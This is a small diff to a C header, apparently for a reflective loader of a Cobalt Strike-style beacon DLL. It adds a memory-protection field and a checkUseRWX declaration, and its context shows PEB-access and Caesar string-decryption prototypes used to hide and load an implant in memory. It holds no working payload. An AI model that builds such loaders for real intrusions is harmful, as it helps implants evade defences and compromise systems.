@@ -21,6 +21,7 @@ typedef struct Dll {
     void* SizeOfOptionalHeader;
     void* NthSection;
     unsigned int NumberOfSections;
+    int BeaconMemoryProtection;
     void* EntryPoint;
     void* TextSection;
     unsigned int TextSectionSize;
@@ -273,6 +274,8 @@ typedef enum _MEMORY_INFORMATION_CLASS {
   MemoryBasicInformation
 } MEMORY_INFORMATION_CLASS;
 
+
+void checkUseRWX(Dll * raw_beacon_dll_struct);
 void * returnRDI();
 void * getPEB();
 void basicCaesar_Decrypt(int stringLength, unsigned char * string, int chiperDecrementKey);
